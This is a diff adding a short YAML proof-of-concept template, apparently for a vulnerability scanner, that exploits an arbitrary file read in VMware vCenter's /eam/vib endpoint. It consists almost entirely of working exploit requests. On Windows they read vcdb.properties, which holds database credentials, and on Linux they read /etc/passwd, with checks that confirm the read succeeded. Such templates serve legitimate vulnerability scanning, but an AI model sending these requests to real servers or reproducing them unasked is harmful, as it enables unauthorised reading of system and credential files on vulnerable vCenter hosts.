@@ -1,0 +1,18 @@
+name: poc-yaml-vmware-vcenter-arbitrary-file-read
+groups:
+  win:
+    - method: GET
+      path: /eam/vib?id=C:\ProgramData\VMware\vCenterServer\cfg\vmware-vpx\vcdb.properties
+      follow_redirects: false
+      expression: |
+        response.status == 200 && response.body.bcontains(b"org.postgresql.Driver")
+  linux:
+    - method: GET
+      path: /eam/vib?id=/etc/passwd
+      follow_redirects: false
+      expression: |
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+detail:
+  author: MrP01ntSun(https://github.com/MrPointSun)
+  links:
+    - https://t.co/LfvbyBUhF5
